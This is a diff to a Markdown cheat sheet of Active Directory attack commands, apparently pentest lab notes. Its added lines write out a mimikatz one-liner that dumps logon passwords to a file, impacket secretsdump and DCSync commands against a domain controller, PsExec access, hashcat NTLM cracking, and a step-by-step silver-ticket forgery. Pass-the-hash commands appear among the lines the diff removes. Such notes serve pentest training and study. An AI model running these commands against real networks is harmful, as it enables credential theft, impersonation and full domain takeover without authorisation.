@@ -279,6 +279,8 @@ Remote invokation:
 
 `./bloodhound.py -d xxx.local -u xxxxxx -p xxx -gc xxx.xxx.local -c all -ns 10.10.10.xxx`
 
+It is important to state the name server!
+
 #### Launching Bloodhound and AD Visualization
 
 1. launch neo4j: `sudo neo4j console`
@@ -368,6 +370,10 @@ sekurlsa::logonpasswords
 
 # get the hash here
 ```
+
+Or just a oneliner
+
+`.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > pass.txt`
 
 ### Password misues
 
@@ -519,21 +525,28 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 
 ```
 
-* Dump Admin credentials with an account that has **permissions to do so**
+* secrets dump
 
-`secretsdump.py xxx/usename@10.10.10.xxx -just-dc-user Administrator`
+`impacket-secretsdump xxx/usename:"ComplexPassword!"@10.10.10.xxx -just-dc-user Administrator`
 
-* Use extracted hash to perform pass the hash attack
+* mimikatz
 
-`psexec.py -hashes :32693b11e6aa90eb43d32c72a07cxxxx "xxx.local/Administrator@10.10.10.xxx"`
+```powershell
 
-or using evil-winrm
+# start session as Domain admin on any machine
 
-`evil-winrm -i 10.10.43.76 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`
+lsadump::dsync /user:corp\Administrator 
 
-PSexec can also be yused from windows client
+```
+
+
+* exploit using psexec
 
 `.\PSExec.exe \\dc1.domain.com cmd`
+
+* or just crack NTLM hash
+
+`hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule --force`
 
 ### Kerberoasting
 
@@ -607,7 +620,7 @@ Silver tickets are essential forged TGS tickets which grant you access to a part
 
 Guide to mimikatz: https://adsecurity.org/?page_id=1821
 
-1. Obtain SID
+1. Obtain SID and SPN
 
 ```powershell
 
@@ -615,10 +628,24 @@ whoami /user
 
 # all numbebers before the relative identifier (last 4 numbers) are SID we need
 
+or use powerview
+
+Import-Module <Path to PowerView.ps1>
+Get-DomainSID
+
+# obtain SPNs
+
+Get-DomainUser -SPN | select sereviceprincipalname
+
 ```
 
+2. Obtain SPN hash
 
-2. Make Silver ticket
+* get hash for this service (no user hash needed)
+* For this refer to credentials dump using mimikatz
+
+3. Make Silver ticket
+
 ```powershell
 
 mimikatz # kerberos::purge
@@ -627,23 +654,30 @@ mimikatz # kerberos::list
 
 # generate RC4 hashed password now with Rubeus, for instance
 
-mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+mimikatz # kerberos::golden /user:user101 /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+
+# actually any user can be used what makes impersonation possible
 
 #finally launch cmd on behalf of impersonated service
-mimikatz # misc::cmd
+mimikatz # exit
+
+# confirm ticket 
+
+klist
+
+# outputs ticket details
+
+# Access the service 
 
 ```
 
-Export tickets to kali
+4. Export tickets to kali
 
 ```bash
 
 mimikatz # kerberos::list /export
 
-
-
 ```
-
 
 #### Rubeus Workflow
 
